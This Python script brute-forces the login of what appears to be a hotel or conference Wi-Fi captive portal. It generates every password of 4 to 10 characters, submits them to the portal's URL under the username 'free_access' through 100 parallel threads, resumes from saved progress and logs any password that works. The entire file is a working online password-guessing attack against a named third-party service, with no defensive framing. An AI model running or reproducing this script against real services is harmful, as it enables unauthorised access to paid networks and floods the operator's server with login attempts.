#!/usr/bin/env python3

import os
import sys
import concurrent.futures
import urllib
import time

import requests
import wordlist
import more_itertools

generator = wordlist.Generator("abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_,!$%&+-#/()=@")
CHECK_PASSWORD_URL = "http://hsia.rieo.eu/process.php?trylogon=yes&language=en&javascript=enabled&ctype=conference&username=free_access&password={password}&connection=conference&terms=on&submit=Connect"

PASSWORD_MIN_LENGHT=4
PASSWORD_MAX_LENGTH=10

WORKERS=100
CHUNK=0
STARTCHUNK=0
STARTCHUNK=0
TIMEOUT=10.0

FILENAME, _ = os.path.splitext(os.path.basename(__file__)) 
FILENAME += ".CHUNK"

try:
    with open(FILENAME) as infile:
        STARTCHUNK = int(infile.read())
except FileNotFoundError:
    pass

def save_chunk():
    with open(FILENAME, "w") as outfile:
        global CHUNK
        chunk_to_save = CHUNK
        outfile.write("%d" % chunk_to_save)
        print(f"\t\t\tSaved {chunk_to_save}\r", end="")


os.environ["HTTP_PROXY"] = ""

if __name__ == "__main__":
    # Try logon
    def check_password(chunk, password):
        url = CHECK_PASSWORD_URL.format(password=urllib.parse.quote_plus(password))
        res = requests.get(url, allow_redirects=False, timeout=TIMEOUT)
        print(f"{chunk} try {password} \r", end="")
        if res.status_code == 200:
            return res.text
        else:
            return False

    # We can use a with statement to ensure threads are cleaned up promptly
    with concurrent.futures.ThreadPoolExecutor(max_workers=WORKERS) as executor:
        # Start the load operations and mark each future with its URL
        try:
            for password_list_chunk in more_itertools.chunked(generator.generate(PASSWORD_MIN_LENGHT,PASSWORD_MAX_LENGTH), WORKERS*10):
                CHUNK+=1
                if CHUNK < STARTCHUNK:
                    print(f"skipping {CHUNK} till {STARTCHUNK}         \r", end="")
                    continue # skip till STARTCHUNK
                elif STARTCHUNK == CHUNK:
                    print()
                save_chunk()
                print(f"\t\t\t\t\t\tStarting from {password_list_chunk[0]}\r", end="")
                future_to_password = {executor.submit(check_password, CHUNK, password): password for password in password_list_chunk}
                for future in concurrent.futures.as_completed(future_to_password):
                    password = future_to_password[future]
                    try:
                        res = future.result()
                    except Exception as exc:
                        print(f"{password} generated an exception: {exc}, rescheduling\r", end="")
                        time.sleep(0.2) # give remote some breathing space
                        executor.submit(check_password, CHUNK, password)
                    else:
                        if res:
                            out=f"\n\nsucceeded with {password}:\n\n{res}"
                            print(out)
                            with open("RESULT", "a") as outfile:
                                outfile.write(out) 
                            executor.shutdown(wait=False)
        except KeyboardInterrupt:
            print("\nShutting down...\n")
            for future in future_to_password:
                future.cancel()
